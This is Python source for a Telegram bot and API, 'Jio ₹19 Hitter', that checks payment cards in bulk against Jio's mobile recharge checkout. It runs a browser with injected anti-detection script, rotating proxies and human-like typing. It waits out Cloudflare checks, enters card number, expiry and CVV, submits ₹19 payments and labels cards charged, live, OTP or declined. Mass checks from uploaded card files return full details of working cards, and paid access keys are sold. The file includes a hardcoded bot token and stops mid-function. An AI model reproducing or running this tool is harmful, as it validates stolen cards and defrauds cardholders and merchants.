"""
H4 x Chk — Jio ₹19 Hitter (Railway)
Owner: @whoh4rsh
"""
import asyncio, time, random, uuid, logging, os, sqlite3, shutil
from datetime import datetime
from threading import Thread
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (ApplicationBuilder, ContextTypes, MessageHandler,
    CommandHandler, CallbackQueryHandler, filters)
from patchright.async_api import async_playwright, TimeoutError as PWTimeout

BOT_TOKEN = os.getenv("BOT_TOKEN", "8031306974:AAE2ibW3rH57WRjuLCmgEyTZeraArjjROoc")
OWNER_ID = int(os.getenv("OWNER_ID", "7077294261"))
OWNER_HANDLE = "@whoh4rsh"
BOT_NAME = "H4 x Chk"
BOT_LIFETIME_DAYS = 30
BOT_BORN = time.time()
DB_PATH = os.getenv("DB_PATH", "h4xchk.db")
HEADLESS = os.getenv("HEADLESS", "false").lower() == "true"
PORT = int(os.getenv("PORT", "7075"))
PLAN_PRICE = 19
JIO_URL = "https://www.jio.com/selfcare/recharge/mobility/"
NAV_TIMEOUT = 45000
JUSPAY_TIMEOUT = 30000

RAW_PROXIES = [
    "in-free-proxy.g-w.info:59783",
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
    "px051003.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780",
]
proxy_index = 0
_check_lock = asyncio.Lock()

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]
VIEWPORTS = [{"width":1920,"height":1080},{"width":1536,"height":864},{"width":1440,"height":900}]

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
delete Object.getPrototypeOf(navigator).webdriver;
window.chrome = {runtime: {}, loadTimes: function() {}, csi: function() {}, app: {isInstalled: false}};
Object.defineProperty(navigator, 'plugins', {get: () => [{name:'PDF Viewer'},{name:'Chrome PDF Viewer'}]});
Object.defineProperty(navigator, 'languages', {get: () => ['en-IN','en-US','en']});
Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
const gp = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function(p) {
    if (p === 37445) return 'Intel Inc.';
    if (p === 37446) return 'Intel Iris OpenGL Engine';
    return gp.call(this, p);
};
Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {get: function() { return window; }});
delete window.__playwright; delete window.__pw_manual; delete window.__PW_inspect;
delete window._puppeteer_; delete window._selenium; delete window.callPhantom;
delete window._phantom; delete window.__nightmare;
const nts = Function.prototype.toString;
Function.prototype.toString = function() {
    if (this === Function.prototype.toString) return 'function toString() { [native code] }';
    return nts.call(this);
};
Date.prototype.getTimezoneOffset = function() { return -330; };
"""

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("h4xchk")

app = FastAPI(title="H4 x Chk API", version="15.0")

def get_browser_path():
    for name in ["chromium", "chromium-browser", "google-chrome", "chrome"]:
        p = shutil.which(name)
        if p: logger.info(f"✅ Browser: {p}"); return p
    return None

# ── DB ──
def db_init():
    con = sqlite3.connect(DB_PATH); cur = con.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT,
        first_seen INTEGER, banned INTEGER DEFAULT 0, role TEXT DEFAULT 'user',
        live_checks INTEGER DEFAULT 0, lifetime INTEGER DEFAULT 0)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER,
        max_uses INTEGER, used_count INTEGER DEFAULT 0, created_at INTEGER, expires_at INTEGER,
        created_by INTEGER, bound_to INTEGER DEFAULT 0, cc_limit INTEGER DEFAULT 50)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS redemptions (user_id INTEGER PRIMARY KEY,
        key TEXT, activated INTEGER, expires_at INTEGER, cc_used INTEGER DEFAULT 0, cc_limit INTEGER DEFAULT 50)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS feedback (id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER, username TEXT, message TEXT, created_at INTEGER)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY CHECK (id=1),
        total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
        jio_checks INTEGER DEFAULT 0, otp_count INTEGER DEFAULT 0)""")
    cur.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
    con.commit(); con.close()

def db(): return sqlite3.connect(DB_PATH)

def ensure_user(uid, un=""):
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
    if not cur.fetchone():
        cur.execute("INSERT INTO users (user_id,username,first_seen,role) VALUES (?,?,?,?)",
            (uid, un or "", int(time.time()), "owner" if uid==OWNER_ID else "user"))
    elif un:
        cur.execute("UPDATE users SET username=? WHERE user_id=?", (un, uid))
    con.commit(); con.close()

def get_user(uid):
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id,username,banned,role,live_checks,lifetime FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone(); con.close()
    if not r: return None
    return {"user_id":r[0],"username":r[1],"banned":r[2],"role":r[3],"live_checks":r[4],"lifetime":r[5]}

def is_owner(uid): return uid == OWNER_ID
def is_admin(uid):
    u = get_user(uid); return bool(u and u["role"] in ("owner","admin"))
def is_banned(uid):
    u = get_user(uid); return bool(u and u["banned"])

def get_active_key(uid):
    con = db(); cur = con.cursor()
    cur.execute("SELECT key,activated,expires_at,cc_used,cc_limit FROM redemptions WHERE user_id=?", (uid,))
    r = cur.fetchone(); con.close()
    if not r: return None
    k,a,e,cu,cl = r
    if not a or e < int(time.time()): return None
    return {"key":k,"expires_at":e,"cc_used":cu,"cc_limit":cl}

def key_days_left(uid):
    k = get_active_key(uid); return 0 if not k else max(0,(k["expires_at"]-int(time.time()))//86400)
def cc_limit_left(uid):
    k = get_active_key(uid); return 0 if not k else max(0, k["cc_limit"]-k["cc_used"])
def has_access(uid):
    return is_owner(uid) or is_admin(uid) or (get_active_key(uid) is not None)

def consume_cc(uid):
    if is_owner(uid) or is_admin(uid): return True
    k = get_active_key(uid)
    if not k or k["cc_used"] >= k["cc_limit"]: return False
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_used=cc_used+1 WHERE user_id=?", (uid,))
    con.commit(); con.close(); return True

def refund_cc(uid):
    if is_owner(uid) or is_admin(uid): return
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_used=cc_used-1 WHERE user_id=? AND cc_used>0", (uid,))
    con.commit(); con.close()

def bump_live(uid):
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET live_checks=live_checks+1, lifetime=lifetime+1 WHERE user_id=?", (uid,))
    cur.execute("UPDATE stats SET total_checks=total_checks+1, jio_checks=jio_checks+1 WHERE id=1")
    con.commit(); con.close()

def bump_hit():
    con = db(); cur = con.cursor()
    cur.execute("UPDATE stats SET total_hits=total_hits+1 WHERE id=1"); con.commit(); con.close()

def bump_otp():
    con = db(); cur = con.cursor()
    cur.execute("UPDATE stats SET otp_count=otp_count+1 WHERE id=1"); con.commit(); con.close()

def reset_cc(uid):
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_used=0 WHERE user_id=?", (uid,)); con.commit(); con.close()

def bot_days_left(): return max(0, BOT_LIFETIME_DAYS - (time.time()-BOT_BORN)//86400)

def gen_key(days, uses, cc_limit, by):
    raw = f"H4X-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
    con = db(); cur = con.cursor()
    cur.execute("INSERT INTO keys (key,days,max_uses,created_at,expires_at,created_by,cc_limit) VALUES (?,?,?,?,?,?,?)",
        (raw,days,uses,int(time.time()),int(time.time())+days*86400,by,cc_limit))
    con.commit(); con.close(); return raw

def redeem_key(uid, key):
    con = db(); cur = con.cursor()
    cur.execute("SELECT key,days,max_uses,used_count,expires_at,bound_to,cc_limit FROM keys WHERE key=?", (key,))
    r = cur.fetchone()
    if not r: con.close(); return False, "❌ Invalid key."
    k,d,mu,uc,exp,bt,cl = r
    if uc >= mu: con.close(); return False, "❌ Key maxed."
    if exp < int(time.time()): con.close(); return False, "❌ Key expired."
    if bt and bt != uid: con.close(); return False, "❌ Bound."
    ne = int(time.time())+d*86400
    cur.execute("INSERT OR REPLACE INTO redemptions (user_id,key,activated,expires_at,cc_used,cc_limit) VALUES (?,?,?,?,?,?)",
        (uid,key,1,ne,0,cl))
    cur.execute("UPDATE keys SET used_count=used_count+1, bound_to=? WHERE key=?", (uid,key))
    con.commit(); con.close()
    return True, f"✅ Key redeemed · {d}d · {cl} CC"

# ── PROXY ──
def fmt_proxy(raw):
    raw = raw.strip()
    if not raw: return None
    if "://" in raw: return raw
    p = raw.split(":")
    if len(p) == 4: return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2: return f"http://{raw}"
    return None

def get_proxy():
    global proxy_index
    if not RAW_PROXIES: return None
    p = RAW_PROXIES[proxy_index % len(RAW_PROXIES)]; proxy_index += 1
    return fmt_proxy(p)

def _parse_proxy_cfg(proxy):
    if not proxy: return None
    if "@" in proxy:
        scheme, rest = proxy.split("://", 1) if "://" in proxy else ("http", proxy)
        auth, hostport = rest.split("@", 1)
        user, pwd = auth.split(":", 1)
        return {"server": f"{scheme}://{hostport}", "username": user, "password": pwd}
    return {"server": proxy}

# ── PLAYWRIGHT ──
async def _hd(min_ms=400, max_ms=1200):
    await asyncio.sleep(random.uniform(min_ms, max_ms) / 1000)

async def _ht(loc, text):
    await loc.click()
    await asyncio.sleep(random.uniform(0.1, 0.3))
    for ch in text:
        await loc.type(ch, delay=random.randint(40, 180))
    await asyncio.sleep(random.uniform(0.2, 0.5))

async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
    async with _check_lock:
        return await _jio_impl(cc, mm, yy, cvv, mobile, proxy, log_cb)

async def _jio_impl(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
    start = time.time()
    yy_f = yy[2:] if len(yy) == 4 else yy
    result = {"status":"error","response":"INIT","code":"PW-000","time":"0.00s",
        "card":f"{cc}|{mm}|{yy}|{cvv}","AMOUNT":"Rs 19","PLAN":"19",
        "NUMBER":mobile or "","proxy":proxy or "direct","gate":"Jio19-PW"}
    if not mobile: mobile = f"9{random.randint(100000000, 999999999)}"

    async def _log(msg, emoji="⏳"):
        if log_cb:
            try: await log_cb(msg, emoji, f"{(time.time()-start):.1f}s")
            except Exception: pass

    proxy_cfg = _parse_proxy_cfg(proxy)
    browser = None; context = None
    await _log("Init", "⚡")

    try:
        async with async_playwright() as p:
            args = ["--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                "--no-sandbox","--disable-dev-shm-usage","--disable-gpu",
                "--no-first-run","--no-default-browser-check",
                "--window-size=1920,1080","--lang=en-IN"]
            await _log("Browser launching", "⏳")
            chrome = get_browser_path()
            kw = {"headless": HEADLESS, "args": args}
            if chrome: kw["executable_path"] = chrome
            browser = await p.chromium.launch(**kw)
            await _log("Browser ready", "✅")

            context = await browser.new_context(
                user_agent=random.choice(UA_POOL),
                viewport=random.choice(VIEWPORTS),
                locale="en-IN", timezone_id="Asia/Kolkata",
                geolocation={"latitude":19.0760,"longitude":72.8777},
                permissions=["geolocation"], proxy=proxy_cfg,
                extra_http_headers={"Accept-Language":"en-IN,en-US;q=0.9,en;q=0.8"},
            )
            await context.add_init_script(STEALTH_JS)
            await _log("Stealth injected", "✅")

            page = await context.new_page()
            await _log("Page created", "✅")

            await _log("Opening jio.com", "⏳")
            try:
                await page.goto("https://www.jio.com/", timeout=NAV_TIMEOUT,
                                wait_until="domcontentloaded")
                await _hd(1500, 3000)
                await page.mouse.move(random.randint(300, 800), random.randint(200, 500))
                await _hd(800, 1500)
                await _log("jio.com loaded", "✅")
            except Exception as e:
                await _log(f"jio.com fail: {str(e)[:25]}", "⚠️")

            await _log("Opening recharge page", "⏳")
            await page.goto(JIO_URL, timeout=NAV_TIMEOUT, wait_until="domcontentloaded")
            await _log("Recharge page loaded", "✅")

            await _log("Cloudflare check", "🔍")
            for i in range(15):
                title = (await page.title()).lower()
                body = ""
                try: body = (await page.inner_text("body")).lower()[:500]
                except Exception: pass
                if "just a moment" in title or "checking" in body or "verify you are human" in body:
                    await _log(f"CF challenge ({i+1}/15)", "🛡️")
                    await asyncio.sleep(2)
                else: break
            await _log("Cloudflare OK", "✅")

            await _log("Finding mobile field", "🔍")
            try:
                mf = page.locator("input[type='tel'], input[name*='mobile' i], input[id*='mobile' i]").first
                await mf.wait_for(state="visible", timeout=10000)
                await _log("Mobile field found", "✅")
                await _ht(mf, mobile)
                await _log(f"Mobile: {mobile}", "✅")
            except PWTimeout:
                await _log("Mobile field NOT found", "❌")
                result.update(status="error", response="Mobile field not found",
                              code="PW-101", time=f"{(time.time()-start):.2f}s")
                return result

            await _hd(1000, 2000)
            await _log("Searching ₹19 plan", "🔍")
            try:
                plan = page.locator("text=/₹\\s*19\\b/").first
                await plan.wait_for(state="visible", timeout=10000)
                await plan.click()
                await _log("₹19 plan selected", "✅")
            except PWTimeout:
                await _log("₹19 plan NOT found", "❌")
                result.update(status="error", response="₹19 plan not found",
                              code="PW-102", time=f"{(time.time()-start):.2f}s")
                return result

            await _hd(800, 1500)
            await _log("Clicking Proceed", "⏳")
            for label in ["Recharge","Proceed","Pay","Continue"]:
                try:
                    btn = page.locator(f"button:has-text('{label}')").first
                    if await btn.is_visible(timeout=2000):
                        await btn.click(); await _log(f"'{label}' clicked", "✅"); break
                except Exception: continue

            await _hd(3000, 5000)
            await _log("Waiting Juspay iframe", "⏳")
            card_frame = None
            for i in range(10):
                for fr in page.frames:
                    u = (fr.url or "").lower()
                    if "juspay" in u or "checkout" in u or "pay" in u:
                        card_frame = fr; await _log(f"Juspay iframe ({i+1}/10)", "✅"); break
                if card_frame: break
                await asyncio.sleep(1)
            if not card_frame:
                await _log("Iframe NOT found", "⚠️"); card_frame = page

            await _log("Finding card fields", "🔍")
            try:
                cn = card_frame.locator("input[name*='card_number' i], input[autocomplete='cc-number']").first
                await cn.wait_for(state="visible", timeout=JUSPAY_TIMEOUT)
                await _ht(cn, cc); await _log("Card filled", "✅")
                exp = card_frame.locator("input[name*='expiry' i], input[autocomplete='cc-exp']").first
                await _ht(exp, f"{mm}/{yy_f}"); await _log(f"Expiry: {mm}/{yy_f}", "✅")
                cv = card_frame.locator("input[name*='cvv' i], input[autocomplete='cc-csc']").first
                await _ht(cv, cvv); await _log("CVV filled", "✅")
            except PWTimeout:
                await _log("Card fields NOT found", "❌")
                result.update(status="error", response="Card fields not found",
                              code="PW-103", time=f"{(time.time()-start):.2f}s")
                return result

            await _hd(600, 1200)
            await _log("Clicking Pay", "⏳")
            try:
                sub = card_frame.locator("button:has-text('Pay'), button[type='submit']").first
                await sub.click(timeout=8000); await _log("Pay clicked", "✅")
            except PWTimeout: await _log("Pay NOT found", "⚠️")

            await _log("Waiting response", "⏳")
            await asyncio.sleep(6)

            body_text = ""
            for fr in page.frames:
                try: body_text += (await fr.inner_text("body")) + "\n"
                except Exception: pass
            tl = body_text.lower()
            result["time"] = f"{(time.time()-start):.2f}s"

            if any(k in tl for k in ["otp","one time password","3d secure","enter otp","verify","authentication","securecode","vbv"]):
                await _log("OTP detected", "🔐")
                result.update(status="otp", response="OTP_REQUIRED", code="PW-OTP"); return result
            if any(k in tl for k in ["success","payment successful","recharge successful","thank you"]):
                await _log("SUCCESS", "💎")
                result.update(status="charged", response="Payment Successful", code="TXN_SUCCESS"); return result
            if any(k in tl for k in ["insufficient","not enough","limit exceeded","balance low"]):
                await _log("LIVE — insufficient", "✅")
                result.update(status="approved", response="INSUFFICIENT_FUNDS (Live)", code="PW-LIVE"); return result
            if any(k in tl for k in ["declined","failed","rejected","invalid card","not authorized"]):
                await _log("DECLINED", "❌")
                result.update(status="declined", response="Declined", code="PW-DEC"); return result

            await _log("Unknown", "❓")
            result.update(status="declined", response="Unknown", code="PW-UNK"); return result

    except Exception as e:
        logger.warning(f"PW err: {str(e)[:80]}")
        await _log(f"Error: {str(e)[:40]}", "⚠️")
        result.update(status="error", response=f"PW_ERROR ({str(e)[:60]})",
                      code="PW-500", time=f"{(time.time()-start):.2f}s")
        return result
    finally:
        try:
            if context: await context.close()
            if browser: await browser.close()
        except Exception: pass

# ── LIVE LOGGER ──
class LiveLogger:
    def __init__(self, bot, chat_id, card, proxy, max_lines=15, interval=1.5):
        self.bot=bot; self.chat_id=chat_id; self.card=card; self.proxy=proxy
        self.max_lines=max_lines; self.interval=interval
        self.lines=[]; self.msg=None; self.start=time.time()
        self._last=0.0; self._lock=asyncio.Lock()

    def _render(self, status=""):
        el = f"{time.time()-self.start:.1f}s"
        h = (f"╔══════════════════════════════════╗\n"
             f"║  📱 JIO ₹19 — LIVE CHECK 💎\n"
             f"╠══════════════════════════════════╣\n"
             f"║  💳 {self.card}\n║  🌐 {self.proxy}\n║  ⏱️  {el}\n"
             f"╠══════════════════════════════════╣\n║  📋 LOGS\n")
        for emoji, ts, msg in self.lines[-self.max_lines:]:
            h += f"║  {emoji} {ts} {msg[:28]}\n"
        if status: h += f"╠══════════════════════════════════╣\n║  {status}\n"
        h += "╚══════════════════════════════════╝"
        return f"```\n{h}\n```"

    async def log(self, msg, emoji="⏳", ts=None):
        async with self._lock:
            ts = ts or f"{time.time()-self.start:.1f}s"
            self.lines.append((emoji, ts, msg))
            now = time.time()
            if now - self._last < self.interval: return
            self._last = now
            await self._flush()

    async def _flush(self, status=""):
        try:
            text = self._render(status)
            if self.msg is None:
                self.msg = await self.bot.send_message(self.chat_id, text, parse_mode="Markdown")
            else:
                await self.msg.edit_text(text, parse_mode="Markdown")
        except Exception as e: logger.warning(f"LL edit: {str(e)[:60]}")

    async def finish(self, status, response, code):
        emap = {"charged":"💎 CHARGED","approved":"✅ LIVE","declined":"❌ DECLINED",
                "otp":"🔐 OTP — SKIPPED","error":"⚠️ ERROR","dead":"☠️ DEAD"}
        sl = f"{emap.get(status, status.upper())} · {code}"
        async with self._lock:
            self.lines.append(("🏁", f"{time.time()-self.start:.1f}s", f"Done: {response[:30]}"))
            self._last = time.time()
            await self._flush(sl)

# ── API ──
class JioReq(BaseModel):
    cc:str; mm:str; yy:str; cvv:str; mobile:str=""; user_id:int=0

@app.post("/api/jio19")
async def api_jio19(req: JioReq):
    if req.user_id and not has_access(req.user_id): raise HTTPException(403, "No key")
    if req.user_id and not consume_cc(req.user_id): raise HTTPException(429, "CC limit")
    r = await jio19_playwright(req.cc, req.mm, req.yy, req.cvv,
                                mobile=req.mobile, proxy=get_proxy())
    if req.user_id:
        bump_live(req.user_id)
        if r["status"] in ("charged","approved"): bump_hit()
        elif r["status"] == "otp": bump_otp()
    return r

@app.get("/")
async def root(): return {"status":"ok","bot":BOT_NAME}

# ── UI ──
def fmt_time(s):
    m, sec = divmod(int(s), 60)
    return f"{m}m {sec}s" if m else f"{sec}s"

def main_kb(uid):
    rows = [
        [InlineKeyboardButton("📱 Jio ₹19 Hitter", callback_data="ui_jio19")],
        [InlineKeyboardButton("📂 Mass Check", callback_data="ui_chk"),
         InlineKeyboardButton("📊 Stats", callback_data="ui_stats")],
        [InlineKeyboardButton("💎 My Account", callback_data="ui_info"),
         InlineKeyboardButton("🔑 Redeem", callback_data="ui_redeem")],
        [InlineKeyboardButton("💬 Feedback", callback_data="ui_fb"),
         InlineKeyboardButton("📖 Help", callback_data="ui_help")],
    ]
    if uid == OWNER_ID or is_admin(uid):
        rows.append([InlineKeyboardButton("👑 Admin", callback_data="ui_admin")])
    return InlineKeyboardMarkup(rows)

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="ad_genkey"),
         InlineKeyboardButton("📊 Stats", callback_data="ad_stats")],
        [InlineKeyboardButton("👥 Users", callback_data="ad_users")],
        [InlineKeyboardButton("⬅️ Back", callback_data="ui_main")],
    ])

def bk(target="ui_main"): return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data=target)]])

def user_card(u, uid):
    live = u["live_checks"] if u else 0; life = u["lifetime"] if u else 0
    kd = key_days_left(uid); cl = cc_limit_left(uid); k = get_active_key(uid)
    used = k["cc_used"] if k else 0; lim = k["cc_limit"] if k else 0
    role = u['role'] if u else 'guest'
    re = {"owner":"👑","admin":"⭐","user":"👤"}.get(role,"👤")
    return (f"╔══════════════════════════════════╗\n"
        f"║  💎 {BOT_NAME} — PROFILE\n"
        f"╠══════════════════════════════════╣\n"
        f"║  {re} Role · {role.upper()}\n║  🆔 ID · `{uid}`\n"
        f"║  ⚡ Live · `{live}`\n║  📊 Life · `{life}`\n"
        f"╠══════════════════════════════════╣\n"
        f"║  🔑 Key · `{kd}`d\n║  💳 CC · `{used}/{lim}`\n║  🎯 Left · `{cl}`\n"
        f"╠══════════════════════════════════╣\n"
        f"║  🤖 Bot · `{bot_days_left()}`d\n"
        f"╚══════════════════════════════════╝")

def welcome_text(u, uid):
    name = u.first_name if u else "User"
    un = f"@{u.username}" if u and u.username else "—"
    role = "OWNER" if uid==OWNER_ID else ("ADMIN" if is_admin(uid) else "USER")
    re = {"OWNER":"👑","ADMIN":"⭐","USER":"👤"}[role]
    return (f"╔══════════════════════════════════╗\n"
        f"║   📱 JIO ₹19 HITTER 💎\n"
        f"║   ⚡ PREMIUM EDITION ⚡\n"
        f"╚══════════════════════════════════╝\n\n"
        f"👋 Welcome, **{name}**!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 Access → {OWNER_HANDLE}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Your Info\n"
        f"  {re} Role · `{role}`\n  🆔 ID · `{uid}`\n  👤 User · {un}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Features\n"
        f"  ✅ Live inline logs\n  ✅ Cloudflare bypass\n"
        f"  ✅ Auto OTP skip\n  ✅ Mass .txt check\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🚀 Ready? Tap below 💎")

def jio_text():
    return (f"📱 **JIO ₹19 HITTER** 💎\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💰 Amount · `₹{PLAN_PRICE}`\n📅 Days · `1`\n📶 Data · `1GB`\n"
        f"━━━━━━━━━━━━━━━━━\n\n"
        f"📝 `/jio cc|mm|yy|cvv [mobile]`\n\n"
        f"💡 `/jio 4111111111111111|12|25|123 9876543210`")

def chk_text():
    return (f"📂 **MASS CHECK** 💎\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📄 Format · `.txt`\n📝 `cc|mm|yy|cvv`\n"
        f"━━━━━━━━━━━━━━━━━\n\n"
        f"1️⃣ .txt file bhejo\n2️⃣ Reply `/chk`")

def help_text():
    return (f"📖 **HELP** 💎\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"▸ `/start` — Menu\n▸ `/jio` — Single\n▸ `/chk` — Mass\n"
        f"▸ `/redeem` — Key\n▸ `/myinfo` — Profile\n"
        f"▸ `/feedback` — Msg\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"👑 `/genkey` `/ban` `/unban` `/botstats` `/users`\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💎 {OWNER_HANDLE}")

# ── COMMANDS ──
async def cmd_start(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): await update.message.reply_text("🚫 Banned."); return
    await update.message.reply_text(welcome_text(u, u.id), parse_mode="Markdown",
        reply_markup=main_kb(u.id), disable_web_page_preview=True)

async def cmd_menu(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    await update.message.reply_text(f"💎 **{BOT_NAME}**", parse_mode="Markdown", reply_markup=main_kb(u.id))

async def cmd_help(update, ctx):
    await update.message.reply_text(help_text(), parse_mode="Markdown", reply_markup=bk())

async def cmd_myinfo(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    await update.message.reply_text(user_card(get_user(u.id), u.id), parse_mode="Markdown", reply_markup=bk())

async def cmd_redeem(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): await update.message.reply_text("🚫"); return
    if not ctx.args: await update.message.reply_text("⚠️ `/redeem KEY`", parse_mode="Markdown"); return
    ok, m = redeem_key(u.id, ctx.args[0].strip())
    await update.message.reply_text(m, parse_mode="Markdown")

async def cmd_feedback(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if not ctx.args: await update.message.reply_text("⚠️ `/feedback msg`"); return
    msg = " ".join(ctx.args)
    con = db(); cur = con.cursor()
    cur.execute("INSERT INTO feedback (user_id,username,message,created_at) VALUES (?,?,?,?)",
        (u.id, u.username or u.first_name, msg, int(time.time())))
    con.commit(); con.close()
    await update.message.reply_text("✅ Sent 💎")
    try: await ctx.bot.send_message(OWNER_ID, f"📩 `{u.id}` @{u.username or u.first_name}\n💬 {msg}", parse_mode="Markdown")
    except Exception: pass

def _card_args(args):
    if not args: return None
    rest = " ".join(args); cp = None
    for sep in ["|","/"," "]:
        p = rest.split(sep)
        if len(p) >= 4: cp = p; break
    if not cp: return None
    mobile = cp[4].strip() if len(cp) >= 5 else ""
    return cp[0], cp[1], cp[2], cp[3], mobile

async def cmd_jio(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): await update.message.reply_text("🚫"); return
    if not ctx.args:
        await update.message.reply_text(jio_text(), parse_mode="Markdown", reply_markup=bk()); return
    if not has_access(u.id): await update.message.reply_text(f"🔑 No key. Contact {OWNER_HANDLE}"); return
    parsed = _card_args(ctx.args)
    if not parsed: await update.message.reply_text("⚠️ `/jio cc|mm|yy|cvv`"); return
    if not consume_cc(u.id): await update.message.reply_text("💳 Limit."); return
    cc, mm, yy, cvv, mobile = parsed
    masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
    proxy = get_proxy() or "direct"
    pd = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
    live = LiveLogger(ctx.bot, update.effective_chat.id, masked, pd, max_lines=18)
    await live.log("Starting", "🚀")
    r = await jio19_playwright(cc, mm, yy, cvv, mobile=mobile, proxy=proxy, log_cb=live.log)
    bump_live(u.id)
    if r["status"] in ("charged","approved"): bump_hit()
    elif r["status"] == "otp": bump_otp()
    elif r["status"] == "error": refund_cc(u.id)
    await live.finish(r["status"], r["response"], r["code"])

def parse_lines(lines):
    cards = []
    for line in lines:
        line = line.strip()
        if not line: continue
        for sep in ["|","/"," "]:
            p = line.split(sep)
            if len(p) >= 4: cards.append((p[0].strip(), p[1].strip(), p[2].strip(), p[3].strip())); break
    return cards

async def cmd_chk(update, ctx):
    u = update.effective_user
    ensure_user(u.id, u.username or "")
    if is_banned(u.id): 
        await update.message.reply_text("🚫 Banned.")
        return
    if not has_access(u.id): 
        await update.message.reply_text("🔑 No key.")
        return
    
    doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not doc: 
        await update.message.reply_text("⚠️ Please send or reply to a .txt file.", parse_mode="Markdown")
        return
        
    status = await update.message.reply_text("📂 Loading...")
    try:
        f = await ctx.bot.get_file(doc.file_id)
        lines = (await f.download_as_bytearray()).decode("utf-8", errors="ignore").splitlines()
        cards = parse_lines(lines)
    except Exception as e: 
        await status.edit_text(f"⚠️ {e}")
        return
        
    if not cards: 
        await status.edit_text("⚠️ No cards found in file.")
        return
        
    await status.delete()
    total = len(cards); start = time.time()
    counts = {"approved":0,"charged":0,"declined":0,"otp":0,"error":0,"limit":0}
    hits = []
    header = await update.message.reply_text(
        f"```\n🚀 MASS CHECK STARTED 💎\n📊 Total · {total}\n📱 Jio ₹19\n```",
        parse_mode="Markdown")
        
    for idx, (cc,mm,yy,cvv) in enumerate(cards, 1):
        masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
        if not consume_cc(u.id): 
            counts["limit"] += 1
            continue
        proxy = get_proxy() or "direct"
        pd = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
        live = LiveLogger(ctx.bot, update.effective_chat.id, masked, pd, max_lines=10)
        await live.log(f"Card {idx}/{total}", "🚀")
        r = await jio19_playwright(cc, mm, yy, cvv, proxy=proxy, log_cb=live.log)
        bump_live(u.id)
        st = r["status"]
        counts[st] = counts.get(st,0)+1
        
        if st == "otp":
            bump_otp()
            await live.finish("otp", r["response"], r["code"])
            await asyncio.sleep(0.5)
            continue
        if st in ("charged","approved"):
            bump_hit()
            hits.append(f"{cc}|{mm}|{yy}|{cvv} — {st.upper()}")
        elif st == "error": 
            refund_cc(u.id)
            
        await live.finish(st, r["response"], r["code"])
        await asyncio.sleep(0.5)
        
    summary = (f"```\n🏁 MASS DONE 💎\n"
        f"📊 Total · {total}\n🕒 Time · {fmt_time(time.time()-start)}\n"
        f"💎 {counts['charged']} ✅ {counts['approved']}\n"
        f"❌ {counts['declined']} 🔐 {counts['otp']}\n"
        f"⚠️ {counts['error']} ⛔ {counts['limit']}\n```")
    await header.edit_text(summary, parse_mode="Markdown")
    if hits:
